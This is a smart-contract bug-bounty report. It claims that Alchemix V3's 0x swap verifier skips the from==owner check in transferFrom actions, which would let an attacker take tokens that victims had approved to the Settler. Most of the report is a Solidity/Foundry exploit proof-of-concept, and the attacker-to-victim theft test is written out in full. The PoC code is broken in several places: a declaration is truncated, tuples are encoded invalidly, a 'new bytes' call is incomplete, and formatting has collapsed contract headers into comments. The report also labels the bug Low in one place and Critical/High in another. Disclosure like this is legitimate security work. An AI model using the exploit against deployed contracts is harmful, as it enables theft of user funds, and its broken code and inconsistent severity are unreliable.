# 56324 sc low missing from owner check in transferfrom verifier direct theft of user funds

**Submitted on Oct 14th 2025 at 15:56:28 UTC by @Bug82427 for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #56324
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The verifier library fails to check the from address when validating transferFrom actions. An attacker can craft 0x calldata that contains transferFrom(token, victim, attacker, amount) and have it pass verification. If the victim previously approved the 0x Settler/aggregator, the Settler will pull tokens from the victim to the attacker in the same transaction. This results in immediate, direct theft of user funds.

## Vulnerability Details

The library function \_verifyTransferFrom decodes the transferFrom action and only verifies that the token equals targetToken. It does not verify that the `from` field equals the owner parameter passed to the verifier. Because of this, calldata that specifies `from = victim` and `to = attacker` will pass verification if `token == targetToken`.

````
 function _verifyTransferFrom(bytes memory action, address owner, address targetToken, uint256 targetAmount) internal view {
        (address token, , , uint256 amount) = abi.decode(
            _slice(action, 4),
            (address, address, address, uint256)
        );

        require(token == targetToken, "IT");
        // Removed balance check as the 0x quote already has slippage protection
    }```

## Impact Details
Impact type (in-scope): Direct theft of user funds (at-rest or in-motion).

Concrete loss: Attacker can move any amount up to the victim’s allowance for the Settler. If the victim granted a large allowance, the attacker can drain substantial funds instantly.

When funds are taken: In the same transaction that executes the Settler call (no waiting period).

Likelihood: High in real systems where users pre-approve aggregators .

Severity: Critical / High — direct transferable value theft with realistic preconditions.

## Proof of Concept

## Proof of Concept
````

// SPDX-License-Identifier: MIT pragma solidity ^0.8.18;

// Foundry test helpers import "forge-std/Test.sol";

/// @notice Minimal ERC20 for PoC (approve/transferFrom/mint) contract SimpleERC20 { string public name; string public symbol; uint8 public decimals = 18; uint256 public totalSupply;

```
mapping(address => uint256) private _balances;
mapping(address => mapping(address => uint256)) private _allowance;

constructor(string memory _name, string memory _symbol) {
    name = _name;
    symbol = _symbol;
}

function mint(address to, uint256 amount) external {
    _balances[to] += amount;
    totalSupply += amount;
}

function balanceOf(address who) external view returns (uint256) {
    return _balances[who];
}

function approve(address spender, uint256 amount) external returns (bool) {
    _allowance[msg.sender][spender] = amount;
    return true;
}

function allowance(address owner, address spender) external view returns (uint256) {
    return _allowance[owner][spender];
}

function transfer(address to, uint256 amount) external returns (bool) {
    require(_balances[msg.sender] >= amount, "balance");
    _balances[msg.sender] -= amount;
    _balances[to] += amount;
    return true;
}

function transferFrom(address from, address to, uint256 amount) external returns (bool) {
    uint256 allowed = _allowance[from][msg.sender];
    require(allowed >= amount, "allowance");
    require(_balances[from] >= amount, "balance");
    _allowance[from][msg.sender] = allowed - amount;
    _balances[from] -= amount;
    _balances[to] += amount;
    return true;
}
```

}

/// @notice Mock Settler that executes TRANSFER\_FROM action contract MockSettler { bytes4 private constant TRANSFER\_FROM = 0x8d68a156;

```
struct SlippageAndActions {
    address recipient;
    address buyToken;
    uint256 minAmountOut;
    bytes[] actions;
}

// Simulate executing actions. For this PoC we only support TRANSFER_FROM action.
function execute(SlippageAndActions calldata saa, bytes[] calldata /*data*/) external {
    for (uint256 i = 0; i < saa.actions.length; i++) {
        bytes calldata action = saa.actions[i];
        require(action.length >= 4, "action too short");
        bytes4 sel;
        // first 4 bytes are selector
        assembly {
            sel := calldataload(action.offset)
        }
        if (sel == TRANSFER_FROM) {
            // decode the parameters for transferFrom: (address token, address from, address to, uint256 amount)
            (address token, address from, address to, uint256 amount) = abi.decode(action[4:], (address, address, address, uint256));
            bool ok = SimpleERC20(token).transferFrom(from, to, amount);
            require(ok, "transferFrom failed");
        } else {
            revert("unsupported action");
        }
    }
}
```

}

/// @notice Vulnerable verifier contract (PoC — key behavior matches your library: missing from==owner check) contract ZeroXVerifier { bytes4 private constant EXECUTE\_SELECTOR = 0xcf71ff4f; bytes4 private constant EXECUTE\_META\_TXN\_SELECTOR = 0x0476baab; bytes4 private constant TRANSFER\_FROM = 0x8d68a156;

```
struct SlippageAndActions {
    address recipient;
    address buyToken;
    uint256 minAmountOut;
    bytes[] actions;
}

function verifySwapCalldata(bytes calldata calldata_, address owner, address targetToken, uint256 /*maxSlippageBps*/)
    external
    view
    returns (bool verified)
{
    if (calldata_.length < 4) return false;
    bytes4 selector = bytes4(calldata_[0:4]);
    require(selector == EXECUTE_SELECTOR || selector == EXECUTE_META_TXN_SELECTOR, "IS");
    // only implement execute(...) path for PoC
    if (selector == EXECUTE_SELECTOR) {
        _verifyExecuteCalldata(calldata_[4:], owner, targetToken);
    } else {
        _verifyExecuteMetaTxnCalldata(calldata_[4:], owner, targetToken);
    }
    return true;
}

function _verifyExecuteCalldata(bytes calldata data, address owner, address targetToken) internal view {
    (SlippageAndActions memory saa, ) = abi.decode(data, (SlippageAndActions, bytes));
    _verifyActions(saa.actions, owner, targetToken);
}

function _verifyExecuteMetaTxnCalldata(bytes calldata data, address owner, address targetToken) internal view {
    (SlippageAndActions memory saa, , , ) = abi.decode(data, (SlippageAndActions, bytes[], address, bytes));
    _verifyActions(saa.actions, owner, targetToken);
}

function _verifyActions(bytes[] memory actions, address owner, address targetToken) internal view {
    for (uint256 i = 0; i < actions.length; i++) {
        _verifyAction(actions[i], owner, targetToken);
    }
}

function _verifyAction(bytes memory action, address owner, address targetToken) internal view {
    if (action.length < 4) revert("Invalid action length");
    bytes4 actionSelector = bytes4(action);
    if (actionSelector == TRANSFER_FROM) {
        _verifyTransferFrom(action, owner, targetToken);
    } else {
        revert("IAC");
    }
}

// VULNERABLE: does not check `from == owner`
function _verifyTransferFrom(bytes memory action, address /*owner*/, address targetToken) internal pure {
    (address token, , , uint256 /*amount*/) = abi.decode(action[4:], (address, address, address, uint256));
    require(token == targetToken, "IT");
    // missing: require(from == owner)
}
```

}

/// @notice Gateway that uses verifier then forwards calldata to settler contract VerifierGateway { address public settler; address public verifier; address public targetToken; uint256 public maxSlippageBps;

```
constructor(address _settler, address _verifier, address _targetToken, uint256 _maxSlippageBps) {
    settler = _settler;
    verifier = _verifier;
    targetToken = _targetToken;
    maxSlippageBps = _maxSlippageBps;
}

// Caller is used as "owner" in the verifier (typical pattern)
function verifyAndExecute(bytes calldata calldata_) external {
    // call the vulnerable verifier
    bool ok = ZeroXVerifier(verifier).verifySwapCalldata(calldata_, msg.sender, targetToken, maxSlippageBps);
    require(ok, "verify failed");

    // forward calldata to the settler exactly as provided
    (bool success, ) = settler.call(calldata_);
    require(success, "exec failed");
}
```

}

/// @notice Foundry test demonstrating exploit contract ZeroXSwapTest is Test { SimpleERC20 token; MockSettler settler; ZeroXVerifier verifier; VerifierGateway gateway;

```
bytes4 private constant TRANSFER_FROM = 0x8d68a156;

function setUp() public {
    // deploy token, settler, verifier, gateway
    token = new SimpleERC20("Mock Token", "MTK");
    settler = new MockSettler();
    verifier = new ZeroXVerifier();
    gateway = new VerifierGateway(address(settler), address(verifier), address(token), 10000);
}

function testExploitTransferFrom() public {
    // actors
    address victim = address(0x1001);
    address attacker = address(0x2002);

    // mint to victim
    uint256 initial = 1000 ether;
    token.mint(victim, initial);
    assertEq(token.balanceOf(victim), initial);

    // victim approves the settler (key prerequisite)
    vm.prank(victim);
    token.approve(address(settler), 500 ether);

    // craft malicious action: selector + abi.encode(token, victim, attacker, amount)
    uint256 stealAmount = 100 ether;
    bytes memory action = abi.encodePacked(TRANSFER_FROM, abi.encode(address(token), victim, attacker, stealAmount));

    // build SlippageAndActions struct in memory and the calldata for execute(...)
    // We need to assemble the struct inline for abi.encodeWithSelector
    bytes;
    actions[0] = action;

    // Build calldata for settler.execute((recipient,buyToken,minAmountOut,actions), bytes[])
    bytes memory saaEncoded = abi.encode(
        abi.encode(address(attacker), address(token), uint256(0), actions) // note: double encode for struct inside encodeWithSelector
    );

    // Simpler: use abi.encodeWithSelector directly passing the tuple types
    bytes memory fullCalldata = abi.encodeWithSelector(
        MockSettler.execute.selector,
        // SlippageAndActions tuple: (address recipient, address buyToken, uint256 minAmountOut, bytes[] actions)
        // For abi.encodeWithSelector we pass the tuple directly:
        (address(attacker), address(token), uint256(0), actions),
        new bytes
    );

    // check balances before
    assertEq(token.balanceOf(victim), initial);
    assertEq(token.balanceOf(attacker), 0);

    // attacker calls gateway.verifyAndExecute with crafted calldata
    vm.prank(attacker);
    gateway.verifyAndExecute(fullCalldata);

    // After exploit: victim lost amount, attacker gained amount
    assertEq(token.balanceOf(victim), initial - stealAmount);
    assertEq(token.balanceOf(attacker), stealAmount);
}
```

}

```
```
